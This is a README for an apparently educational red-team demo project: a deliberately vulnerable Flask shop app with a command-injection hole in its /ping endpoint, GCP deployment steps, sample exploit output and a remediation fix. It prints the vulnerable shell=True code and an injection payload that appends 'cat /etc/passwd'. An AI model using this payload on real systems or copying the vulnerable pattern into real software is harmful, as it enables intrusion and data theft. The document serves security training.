# 🔴 Red Team Demonstration - Command Injection Exploit

<p align="center">
  <img src="https://img.shields.io/badge/Security-Red%20Team-red?style=for-the-badge" alt="Red Team">
  <img src="https://img.shields.io/badge/Vulnerability-Command%20Injection-orange?style=for-the-badge" alt="Command Injection">
  <img src="https://img.shields.io/badge/Platform-GCP%20Cloud%20Run-blue?style=for-the-badge" alt="GCP Cloud Run">
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="MIT License">
</p>

---

## ⚠️ SECURITY WARNING

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ⚠️  THIS PROJECT CONTAINS INTENTIONALLY VULNERABLE CODE ⚠️                  ║
║                                                                               ║
║   FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY               ║
║                                                                               ║
║   • NEVER deploy this application in production environments                  ║
║   • NEVER use the exploit against systems without explicit authorization     ║
║   • Unauthorized access to computer systems is ILLEGAL                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

## 📋 Overview

This project demonstrates a complete red team engagement scenario featuring:

1. **A Vulnerable E-commerce Application** - A Flask web application with an intentional command injection vulnerability
2. **GCP Cloud Run Deployment** - Scripts to deploy the vulnerable app to Google Cloud
3. **Exploitation Framework** - A Python script that exploits the vulnerability and exfiltrates data

### Use Cases

- 🎓 **Security Training** - Teach developers about command injection vulnerabilities
- 🔬 **Penetration Testing Practice** - Safe environment to practice exploitation techniques
- 📊 **Security Demonstrations** - Show stakeholders the impact of insecure code
- 🛡️ **Defense Testing** - Test security monitoring and detection capabilities

---

## 🏗️ Project Structure

```
red-team-demo/
├── README.md                         # This file
├── app/                              # Vulnerable e-commerce application
│   ├── app.py                        # Flask app with command injection
│   ├── Dockerfile                    # Container definition
│   ├── requirements.txt              # Python dependencies
│   └── productdata.txt               # Sensitive data (exfiltration target)
├── exploit/                          # Exploitation scripts
│   ├── exploit.py                    # Main exploit script
│   └── README.md                     # Exploit usage instructions
├── deploy/                           # GCP deployment scripts
│   ├── deploy.sh                     # Deploy to Cloud Run
│   ├── test-local.sh                 # Test locally with Docker
│   └── cleanup.sh                    # Remove GCP resources
└── docs/                             # Documentation
    ├── SETUP.md                      # Setup instructions
    ├── VULNERABILITY.md              # Vulnerability details
    └── ATTACK-DEMO.md                # Attack walkthrough
```

---

## 🚀 Quick Start

### Prerequisites

- **Python 3.8+** with `requests` library
- **Docker** installed and running
- **Google Cloud SDK** (`gcloud` CLI)
- **GCP Project** with billing enabled

### Step 1: Test Locally

```bash
# Make scripts executable
chmod +x deploy/*.sh

# Build and run locally
./deploy/test-local.sh

# Test the exploit locally
cd exploit
pip install requests
python exploit.py http://localhost:8080
```

### Step 2: Deploy to GCP Cloud Run

```bash
# Set your GCP project (optional, defaults to yc-hack-org)
export GCP_PROJECT="your-project-id"

# Deploy to Cloud Run
./deploy/deploy.sh
```

### Step 3: Exploit the Deployed Application

```bash
# Use the URL from the deployment output
python exploit/exploit.py https://vulnerable-ecommerce-xxxxx-uc.a.run.app
```

### Step 4: Clean Up

```bash
# Remove all GCP resources
./deploy/cleanup.sh
```

---

## 🎯 The Vulnerability

The application contains a **Command Injection** vulnerability (CWE-78) in the `/ping` endpoint:

```python
@app.route('/ping')
def ping():
    host = request.args.get('host', 'localhost')
    # VULNERABLE: User input passed directly to shell
    result = subprocess.check_output(f'ping -c 1 {host}', shell=True)
    return jsonify({'output': result.decode()})
```

### Attack Vector

```
GET /ping?host=localhost;cat /etc/passwd
```

The semicolon terminates the `ping` command and executes arbitrary commands.

---

## 📸 Example Output

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗            ║
║   ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║            ║
║   ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║            ║
║   ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║            ║
║   ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║            ║
║   ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝            ║
║                   Command Injection Exploit Framework                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝

════════════════════════════════════════════════════════════════════════════════
  TARGET VERIFICATION
════════════════════════════════════════════════════════════════════════════════

[*] Target URL: https://vulnerable-ecommerce-xxxxx-uc.a.run.app
[✓] Target is online!
[✓] Vulnerable endpoint found: /ping

════════════════════════════════════════════════════════════════════════════════
  EXPLOITATION PHASE
════════════════════════════════════════════════════════════════════════════════

[1/8] Identify current user
[⚡] Executing: whoami
[✓] Command executed successfully!
────────────────────────────────────
  appuser
────────────────────────────────────

[5/8] EXFILTRATE SENSITIVE DATA
[⚡] Executing: cat productdata.txt
[✓] Command executed successfully!

══════════════════════════════════════════════════════════════
  🚨 SENSITIVE DATA EXFILTRATED 🚨
══════════════════════════════════════════════════════════════
(Database credentials, API keys, internal network info...)
══════════════════════════════════════════════════════════════
```

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [docs/SETUP.md](docs/SETUP.md) | Detailed setup instructions |
| [docs/VULNERABILITY.md](docs/VULNERABILITY.md) | Technical vulnerability analysis |
| [docs/ATTACK-DEMO.md](docs/ATTACK-DEMO.md) | Step-by-step attack walkthrough |
| [exploit/README.md](exploit/README.md) | Exploit script usage |

---

## 🛡️ Remediation

To fix the command injection vulnerability:

```python
# SECURE: Use subprocess with argument list (no shell)
import shlex
import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host', 'localhost')
    
    # Validate input - only allow hostname/IP patterns
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        return jsonify({'error': 'Invalid hostname'}), 400
    
    # Use argument list - NOT shell=True
    result = subprocess.check_output(['ping', '-c', '1', host])
    return jsonify({'output': result.decode()})
```

---

## ⚖️ Legal Notice

This software is provided for **educational and authorized security testing purposes only**.

- You must have explicit written authorization before testing any system
- Unauthorized access to computer systems is illegal
- The authors are not responsible for misuse of this software

**Relevant Laws:**
- 🇺🇸 Computer Fraud and Abuse Act (CFAA)
- 🇬🇧 Computer Misuse Act 1990
- 🇪🇺 EU Directive 2013/40/EU
- Similar laws in other jurisdictions

---

## 📄 License

MIT License - See [LICENSE](LICENSE) for details.

**Educational Use Only** - This project is intended for learning and authorized security testing.

---

## 🤝 Contributing

Contributions are welcome for educational improvements:

1. Fork the repository
2. Create a feature branch
3. Submit a pull request

Please ensure all contributions maintain the educational focus of this project.

---

<p align="center">
  <strong>🔴 Built for Security Education 🔴</strong><br>
  <em>Learn to attack. Learn to defend.</em>
</p>
